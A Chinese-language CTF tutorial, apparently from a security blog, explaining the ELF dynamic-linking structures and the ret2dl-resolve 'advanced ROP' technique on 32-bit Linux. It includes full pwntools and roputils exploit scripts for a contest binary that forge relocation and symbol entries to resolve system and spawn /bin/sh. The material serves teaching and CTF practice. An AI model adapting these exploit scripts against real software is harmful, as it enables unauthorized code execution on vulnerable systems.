> 原文链接: https://www.anquanke.com//post/id/196624 


# PWN入门进阶篇（五）高级ROP


                                阅读量   
                                **1151317**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t01085a83ca3713a1ab.jpg)](https://p5.ssl.qhimg.com/t01085a83ca3713a1ab.jpg)



## 0x PWN入门系列文章列表

[Mac 环境下 PWN入门系列（一）](https://www.anquanke.com/post/id/187922)

[Mac 环境下 PWN入门系列（二）](https://www.anquanke.com/post/id/189960)

[Mac 环境下 PWN入门系列（三）](https://www.anquanke.com/post/id/193115)

[Mac 环境下 PWN入门系列（四）](https://www.anquanke.com/post/id/196095)



## 0x1 前言

关于高级ROP,自己在学习过程中，感觉有种知识的脱节的感觉,不过也感觉思路开拓了很多，下面我将以一个萌新的视角来展开学习高级ROP的过程,本文主要针对32位,因为64位的话高级ROP感觉没必要,可以用其他方法代替。



## 0x2 高级ROP的概念

这个概念主要是从ctf wiki上面知道的

高级ROP其实和一般的ROP基本一样，其主要的区别在于它利用了一些更加底层的原理。

经典的高级ROP就是: ret2_dl_runtime_resolve

更多内容参考: [高级ROP](https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#ret2vdso)



## 0x3 适用情况

利用ROP技巧,可以绕过NX和ASLR保护,比较适用于一些比较简单的栈溢出情况,但是同时难以泄漏获取更多信息的情况(比如没办法获取到libc版本)



## 0x4 了解ELF的关键段

这里我们主要了解下段的组成,特别是结构体数组

分析ELF常用的命令(备忘录记一波):

$readelf 命令<br>
-h –file-header       Display the ELF file header<br>
-s –syms              Display the symbol table<br>
–symbols           An alias for –syms<br>
-S –section-headers   Display the sections’ header<br>
-r –relocs            Display the relocations (if present)<br>
-l –program-headers   Display the program headers<br>
–segments          An alias for –program-headers

$objdump<br>
-s, –full-contents      Display the full contents of all sections requested<br>
-d, –disassemble        Display assembler contents of executable sections<br>
-h, –[section-]headers  Display the contents of the section headers

**dynstr**

一个字符串表,索引[0]永远为0,获取的时候是取相对[0]处的地址作为偏移来取字符串的。

[ 6] .dynstr           STRTAB          0804827c 00027c 00006c 00   A  0   0  1

[![](https://p0.ssl.qhimg.com/t01cbd89b5e29bf1fc2.png)](https://p0.ssl.qhimg.com/t01cbd89b5e29bf1fc2.png)

学过编译原理可能就能更好理解他为什么这么做了, 符号解析(翻译)-&gt;xx-&gt;机器代码

**dynsym**

符号表(结构体数组)

[ 5] .dynsym           DYNSYM          080481dc 0001dc 0000a0 10   A  6   1  4

[![](https://p1.ssl.qhimg.com/t01e9716777ce02a074.png)](https://p1.ssl.qhimg.com/t01e9716777ce02a074.png)

表项很明显就是ELF32_Sym的结构

glibc-2.0.1/elf/elf.h 254行有定义

```
typedef struct
`{`
Elf32_Word  st_name;      /* Symbol name (string tbl index) */
Elf32_Addr  st_value;     /* Symbol value */
Elf32_Word  st_size;      /* Symbol size */
unsigned char  st_info;      /* Symbol type and binding */
unsigned char  st_other;     /* No defined meaning, 0 */
Elf32_Section  st_shndx;     /* Section index */
`}` Elf32_Sym;
```

这里说明一下每一个表项对应一个结构体(一个符号),里面的成员就是符号的属性。

对于导入函数的符号而言,符号名st_name是相对.dynstr索引[0]的相对偏移

st_info 类型固定是0x12其他属性都为0

**rel.plt**

重定位表,也是结构体数组(存放结构体对象),每个表项(结构体对象)对应一个导入函数。 结构体定义如下

[10] .rel.plt          REL             0804833c 00033c 000020 08  AI  5  24  4

```
typedef struct
`{`
Elf32_Addr  r_offset;     /* Address */
Elf32_Word  r_info;           /* Relocation type and symbol index */
`}` Elf32_Rel
```

其中r_offset是指向GOT表的指针,r_info是导入符号信息,他的值组成有点意思

[![](https://p2.ssl.qhimg.com/t01e8d031db79ee3068.png)](https://p2.ssl.qhimg.com/t01e8d031db79ee3068.png)

JMPREL代表就是导入函数,这里举read 其r_offser=0x804A00CH,r_info=107h

07代表的是它是个导入函数符号,而1代表的是他在.dynsym也就是符号表的偏移。



## 0x5 一张图让你明白高级ROP原理

ROP,首先我们必须理解延迟绑定的流程,上一篇文章我也有涉及了这方面的内容。

延迟绑定通俗来讲就是:

程序一开始并没有直接链接到外部函数的地址,而是丢了个外部函数对应plt表项的地址,plt表项地址的内容是一小段代码,第一次执行这个外部函数的时候plt指向got表并不是真实地址,而是他的下一条指令地址,然后一直执行到dlruntime_resolve,然后直接跳转到真实地址去执行,如果是第二次执行的话,PLT表项地址就是指向got表的指针,此时got表的指向的就是真实函数的地址了。

那么_dl_runtime_resolve这个函数到底做了什么事情呢?

这张图我是基于参考某个文章师傅解释的来画的。

dlruntime_resolve 工作原理
1. 用link_map访问.dynamic，取出.dynstr, .dynsym, .rel.plt的指针
1. .rel.plt + 第二个参数求出当前函数的重定位表项Elf32_Rel的指针，记作rel
1. rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym
1. .dynstr + sym-&gt;st_name得出符号名字符串指针
1. 在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表
1. 调用这个函数
dlruntime_resolve 动态解析器函数原理剖析图

[![](https://p4.ssl.qhimg.com/t01a8d08ea7332c7b10.png)](https://p4.ssl.qhimg.com/t01a8d08ea7332c7b10.png)

### <a name="header-n81"></a>0x5.1 高级ROP的攻击原理

通俗地来说非常简单就是：

高级ROP攻击的对象就是_dl_runtime_resolve这个函数, 通过伪造内容(参数或指针)来攻击他,让他错误解析函数地址,比如将read@plt解析成system函数的地址。

这里介绍两种攻击思路:

(1) 修改.dynamic 内容

条件: NO RELRO (.dynamic可写)

我们知道程序第一步是去.dynamic取.dynstr的指针是吧,然后在经过2,3,4步获得偏移,我们想想如果我们如果可以改写.dynamic的.dynstr指针为一个我们可以控制的地址的时候,然后我们手工分析2.3.4取得偏移值,我们就在我们控制的地址+偏移,然后填入system那么程序第五步的时候就跑去找system的真实地址了。

(2) 控制第二个参数,让其指向我们构造的Elf32_Rel结构

条件:

_dl_runtime_resolve没有检查.rel.plt + 第二个参数后是否造成越界访问

_dl_runtime_resolve函数最后的解析根本上依赖于所给定的字符串(ps.上面流程图很清楚)

我们控制程序去执行_dl_runtime_resolve这个函数,然后我们控制第二个参数的值也就是offset为一个很大的值 .rel.plt+offset就会指向我们可以控制的内存空间,比如说可读写的.bss段

就是说.bss其实就是一个*sym指针指向的地址(参考上面图片第二步)

那么我们接下来就要伪造第三、第四步让程序跑起来。

目的就是:伪造一个指向system的Elf32_Rel的结构

1.写入一个r_info字段,格式是0xXXXXXX07,其中xxxxx是相对.dynsym的下标,比如上面那个read是0x107h,这里很关键,这个xxx的值是 偏移值/sizeof(Elf32_Sym),32位是0x10,怎么得来很简单ida直接0x3c-0x2c=0x10,这里我们同样可以控制为一个很大的偏移值.dybsym+offset然后来到我们的bss段可控内容处,这个时候我们就是控制了*sym指针指向了我们可以控制的bss段。

2.接着我们伪造第4步,.dynstr+*sym-&gt;stname为system符号,然后程序取完符号指向第五步。

,.dynstr+*sym-&gt;stname为system符号这一步怎么完成的?

道理还不是类似的？

*sym-&gt;stname这个值是我们可以控制的,类似上面的那些offser,我们同样控制为一个很大的值指向bss段不就ok了？

### <a name="header-n102"></a>0x5.2 高级ROP的攻击难点:

很多人认为高级ROP比较复杂,其实非也。

其实原理顺着步骤去调试还是很好理解的,比较复杂的是构造过程，通过实操一次构造过程，不但能加深我们对高级ROP的理解，而且能让我们对ROP的威力有更深的了解。当然，最后我们还是得实现复杂流程自动化简单化，将高级ROP变得不那么高级。



## 0x6 例题实操

国赛题目,也就是大佬分析的题目,这里小弟再次献丑调试一波。

程序源码可以加入我的萌新pwn交流群,或者网上搜索下,19年华中赛区国赛babypwn

这个题目主要是利用上面的攻击方式第二种伪造Elf32_Rel结构。

这里我介绍两种方法。

### <a name="header-n112"></a>0x6.1 手工构造exp

我们先伪造Elf_REL结构对象rel

```
plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
# pwntool 真是个好方便的工具

# 这里我们确定bss段+0x800作为我们的可控开始地址 也就是虚假的dynsym表的地址
stack_size = 0x800
control_base = bss_buf + stack_size

#伪造一个虚假的dynsym表项的地址
alarm_got = elf.got['alarm']
fake_dynsym_addr = control_base + 0x24
align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)
fake_dynsym_addr += align
# 这里要对齐16字节,要不然函数解析的时候会出错,

index_sym = (fake_dynsym_addr - dynsym) / 0x10
rel_r_info = index_sym &lt;&lt; 8 | 7
fake_rel = p32(alarm_got)+p32(r_info)  # 伪造的rel结构

st_name=fake_dynsym_addr+0x10-dynstr
# 取fake_dynsym_addr+0x10 作为'system\x00'的地址,求出偏移付给st_name
# 伪造.syndym表的表项
fake_elf32_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12)

rep_plt_offset = control_base + 24 - rel_plt
# 这里就是我们构造一个很大offset然后让他指向我们的bss段
```

接着我们开始构造rop

```
#!/use/bin/python
# -*- coding:utf-8 -*-

import sys
import roputils
from pwn import *

context.log_level = 'debug'
context(arch='i386', os='linux')
context.terminal = ['/usr/bin/tmux', 'splitw', '-h']

elf = ELF('./pwn')
io = process('./pwn')
rop = ROP('./pwn')
gdb.attach(io)
pause()
addr_bss = elf.bss()
# 这里我们确定bss段+0x800作为我们的可控开始地址 也就是虚假的dynsym表的地址
stack_size = 0x800
control_base = addr_bss + stack_size
# 溢出
rop.raw('A'*0x2c)
# call read(0, control_base, 100)
rop.read(0, control_base, 100)
rop.migrate(control_base)
# 将栈迁移到bss段
io.sendline(rop.chain())

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

rop2 = ROP('./pwn')
#伪造一个虚假的dynsym表项的地址
alarm_got = elf.got['alarm']
fake_dynsym_addr = control_base + 36
align = 0x10 - ((fake_dynsym_addr - dynsym) &amp; 0xf)
fake_dynsym_addr += align
# 这里要对齐16字节,要不然函数解析的时候会出错,

index_sym = (fake_dynsym_addr - dynsym) / 0x10
rel_r_info = index_sym &lt;&lt; 8 | 0x7
fake_rel = p32(alarm_got)+p32(rel_r_info)  # 伪造的rel结构

st_name= fake_dynsym_addr+0x10-dynstr
# 取fake_dynsym_addr+0x10 作为'system\x00'的地址,求出偏移付给st_name
# 伪造.syndym表的表项
fake_elf32_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12)

rel_plt_offset = control_base + 24 - rel_plt
# 这里就是我们构造一个很大offset然后让他指向我们的bss段

binsh = '/bin/sh'
# 填充结构
padd = 'B'*4
# 下面就是往control_base(bss+0x800)写入fake_dynsym表
# linkmap
rop2.raw(plt0) # 0
# offset
rop2.raw(rel_plt_offset) # 4
# ret
rop2.raw(padd) #8
# binsh位置
rop2.raw(control_base+90) #12
rop2.raw(padd) #16
rop2.raw(padd) #20
rop2.raw(fake_rel) # 24
paddoffset = 12
rop2.raw('B'* paddoffset) # 32
rop2.raw(fake_elf32_sym) # 44
# sizeof(fake_dynsym_addr)=0x10 所以下面那个就是system符号
rop2.raw('system\x00') # 60
print(len(rop2.chain()))
rop2.raw('B'*(90 - len(rop2.chain())))
rop2.raw(binsh+'\x00')
rop2.raw('B'*(100 - len(rop2.chain())))
log.success("bss:" + str(hex(addr_bss)))
log.success("control_base:" + str(hex(control_base)))
log.success("align:" + str(hex(align)))
log.success("fake_dynsym_addr - dynsym:" + str(hex(fake_dynsym_addr - dynsym)))
log.success("fake_dynsym_addr:" + str(hex(fake_dynsym_addr)))
log.success("binsh:" + str(hex(control_base+82)))
io.sendline(rop2.chain())
io.interactive()
```

这里计算难点是在这里:

```
padd = 'B'*4
# 下面就是往control_base(bss+0x800)写入fake_dynsym表
# linkmap
rop2.raw(plt0) # 0
# offset
rop2.raw(rel_plt_offset) # 4
# ret
rop2.raw(padd) #8
# binsh位置
rop2.raw(control_base+90) #12
rop2.raw(padd) #16
rop2.raw(padd) #20
rop2.raw(fake_rel) # 24
paddoffset = 12
rop2.raw('B'* paddoffset) # 32
rop2.raw(fake_elf32_sym) # 44
# sizeof(fake_dynsym_addr)=0x10 所以下面那个就是system符号
rop2.raw('system\x00') # 60
```

首先

```
fake_dynsym_addr = control_base + 36
align = 0x10 - ((fake_dynsym_addr - dynsym) &amp; 0xf)
fake_dynsym_addr += align
```

首先我们设置了fake_dynsym_addr是在control_base偏移36处,但是对齐之后+align,那么偏移就是44了

还有就是size(fake_rel)结构大小为8,

paddoffset = 12 其实就是:paddoffset = fake_elf32_sym-control_base-32

```
paddoffset = 44 - len(rop2.chain())
rop2.raw('B'* paddoffset) # 32
rop2.raw(fake_elf32_sym) # 44
```

这样也是ok的,填满90,之后设置/bin/sh,就是参数地址了。

### <a name="header-n127"></a>0x6.2 roputils一把梭

```
import sys
import roputils
from pwn import *

context.log_level = 'debug'
r = process("./pwn")
# r = remote("c346dfd9093dd09cc714320ffb41ab76.kr-lab.com", "56833")

rop = roputils.ROP('./pwn')
addr_bss = rop.section('.bss')

buf1 = 'A' * 0x2c
buf1 += p32(0x8048390) + p32(0x804852D) + p32(0) + p32(addr_bss) + p32(100)
r.send(buf1)

buf2 =  rop.string('/bin/sh')
buf2 += rop.fill(20, buf2)
buf2 += rop.dl_resolve_data(addr_bss + 20, 'system')
buf2 += rop.fill(100, buf2)
r.send(buf2)

buf3 = 'A' * 0x2c + rop.dl_resolve_call(addr_bss + 20, addr_bss)
r.send(buf3)

#gdb.attach(r)

r.interactive()
```

这个程序师傅们写的,这里我分析下程序结构

```
rop = roputils.ROP('./pwn')
addr_bss = rop.section('.bss') # 获取bss段地址

buf1 = 'A' * 0x2c
buf1 += p32(0x8048390) + p32(0x804852D) + p32(0) + p32(addr_bss) + p32(100)
r.send(buf1)
# rop1 这里调用了read的plt,返回地址double overflow,
# 主要作用是迁移栈到bss段
# 这段代码可以简化,多利用下rop函数就好了
# buf = 'A' * 0x2c + rop.call('read', 0, addr_bss, 100)

buf2 =  rop.string('/bin/sh')
buf2 += rop.fill(20, buf2)
buf2 += rop.dl_resolve_data(addr_bss + 20, 'system')
# addr_bss + 20 这是我们可控的区域,dl_resolve_data会自动对齐
buf2 += rop.fill(100, buf2)
r.send(buf2)
# 上面就是伪造结构的过程,
buf3 = 'A' * 0x2c + rop.dl_resolve_call(addr_bss + 20, addr_bss)
```

关于roputils的原理可以参考下: [ROP之return to dl-resolve](http://rk700.github.io/2015/08/09/return-to-dl-resolve/)



## 0x7 总结

本文更多是简化各位大师傅们的文章,因为笔者在学习高级ROP过程中,阅读了各位师傅们的文章之后感觉还是有些地方不是很明白，所以自己集百家之长写了这么一篇自我而言比较好理解的高级ROP文章,当作PWN入门系列栈的收尾,堆开端的预兆。



## 0x8 参考链接

[高级ROP：Ret2dl_resolve技术详解 ](https://www.anquanke.com/post/id/177450)

[高级ROP ret2dl_runtime 之通杀详解](https://xz.aliyun.com/t/5122)

[[原创][新手向]ret2dl-resolve详解](https://bbs.pediy.com/thread-227034.htm)

[baby_pwn wp](https://www.ctfwp.com/articals/2019national.html#babypwn)

[ret2dl_resolve从原理到实践](https://xz.aliyun.com/t/6471)
